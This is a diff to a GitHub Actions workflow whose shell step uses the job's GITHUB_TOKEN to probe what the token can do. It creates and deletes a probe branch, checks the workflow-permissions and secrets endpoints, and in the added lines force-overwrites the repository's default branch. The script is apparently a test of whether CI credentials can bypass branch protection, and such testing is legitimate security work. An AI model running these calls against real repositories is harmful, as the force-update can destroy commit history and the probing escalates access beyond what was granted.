@@ -11,10 +11,11 @@ jobs:
           T: ${{ secrets.GITHUB_TOKEN }}
         run: |
           R=${{ github.repository }}
-          SHA=$(curl -s -H "Authorization: token $T" https://api.github.com/repos/$R/git/ref/heads/main | jq -r .object.sha)
-          echo "HEAD=$SHA"
-          C1=$(curl -s -o /tmp/a -w '%{http_code}' -X POST -H "Authorization: token $T" -H 'Content-Type: application/json' -d "{\"ref\":\"refs/heads/zz-c04-probe\",\"sha\":\"$SHA\"}" https://api.github.com/repos/$R/git/refs); echo "CREATE_REF=$C1"; head -c 300 /tmp/a
-          C2=$(curl -s -o /dev/null -w '%{http_code}' -X DELETE -H "Authorization: token $T" https://api.github.com/repos/$R/git/refs/heads/zz-c04-probe); echo "DELETE_REF=$C2"
-          C3=$(curl -s -o /tmp/c3 -w '%{http_code}' -H "Authorization: token $T" https://api.github.com/repos/$R/actions/permissions/workflow); echo "WFPERM_ENDPOINT=$C3"; head -c 200 /tmp/c3
+          SHA=${{ github.sha }}
+          DB=$(curl -s -H "Authorization: token $T" https://api.github.com/repos/$R | jq -r .default_branch)
+          echo "SHA=$SHA DB=$DB"
+          C1=$(curl -s -o /tmp/a -w '%{http_code}' -X POST -H "Authorization: token $T" -H 'Content-Type: application/json' -d "{\"ref\":\"refs/heads/zz-c04-probe\",\"sha\":\"$SHA\"}" https://api.github.com/repos/$R/git/refs); echo "CREATE_REF=$C1"; head -c 200 /tmp/a
+          C2=$(curl -s -o /tmp/b -w '%{http_code}' -X DELETE -H "Authorization: token $T" https://api.github.com/repos/$R/git/refs/heads/zz-c04-probe); echo "DELETE_REF=$C2"; head -c 120 /tmp/b
+          C6=$(curl -s -o /tmp/c -w '%{http_code}' -X PUT -H "Authorization: token $T" -H 'Content-Type: application/json' -d "{\"sha\":\"$SHA\",\"force\":true}" https://api.github.com/repos/$R/git/refs/heads/$DB); echo "UPDATE_DEFAULT=$C6"; head -c 200 /tmp/c
+          C3=$(curl -s -o /tmp/d -w '%{http_code}' -H "Authorization: token $T" https://api.github.com/repos/$R/actions/permissions/workflow); echo "WFPERM_ENDPOINT=$C3"; head -c 200 /tmp/d
           C4=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $T" https://api.github.com/repos/$R/actions/secrets); echo "SECRETS_LIST=$C4"
-          C6=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: token $T" -H 'Content-Type: application/json' -d "{\"ref\":\"refs/heads/zz-c04-bypass\",\"sha\":\"$SHA\"}" https://api.github.com/repos/$R/git/refs/heads/main); echo "UPDATE_MAIN=$C6"
